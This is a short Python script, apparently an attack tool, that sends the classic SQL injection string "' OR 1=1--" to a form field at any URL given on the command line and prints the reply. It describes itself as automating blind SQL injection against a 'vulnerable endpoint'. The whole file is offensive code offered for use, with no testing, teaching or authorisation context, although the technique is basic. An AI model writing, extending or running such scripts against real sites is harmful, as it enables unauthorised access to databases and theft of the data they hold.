import requests
import argparse

# Function to send SQL payloads and receive the response
def send_payload(target_url, payload):
    # Sends the payload to the target URL
    response = requests.post(target_url, data={"input_field": payload})
    return response.text

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Automate blind SQL injection tasks.")
    parser.add_argument("target_url", help="The URL of the vulnerable endpoint to target")
    args = parser.parse_args()

    # Use the target URL from the command line
    target_url = args.target_url
    test_payload = "' OR 1=1--"

    # Send a test payload and print the response
    result = send_payload(target_url, test_payload)
    print("Response from server:", result)
